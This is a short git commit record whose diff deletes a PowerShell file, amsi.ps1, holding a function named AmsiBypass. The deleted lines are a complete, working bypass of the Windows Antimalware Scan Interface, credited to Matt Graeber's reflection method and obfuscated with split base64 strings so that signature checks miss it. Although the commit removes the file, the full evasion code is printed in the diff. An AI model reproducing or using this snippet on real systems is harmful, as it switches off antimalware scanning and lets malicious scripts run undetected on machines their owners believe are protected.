f2b5b8d88710eb6f62448afcc605d32f9fd171ba
St3v3a <steve.atco@gmail.com>
2021-03-24 10:04:32 +0000

    Delete amsi.ps1

--- amsi.ps1
+++
@@ -1,5 +0,0 @@
-﻿function AmsiBypass
-{
-    #This is Matt Graebers Reflection method bypass with changes to triggers 
-    (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('QQBt'+'AHMAaQA'+'qAHQAaQB'+'sAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('T'+'gB'+'vAG4AUAB1AGIAb'+'ABpAGMALABTAHQAYQB0A'+'GkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('Y'+'QBtAHMA'+'aQBJAG4Aa'+'QB0ACoAYQB'+'pAGwAZQ'+'BkAA==')))}).SetValue($null,$true)
-}
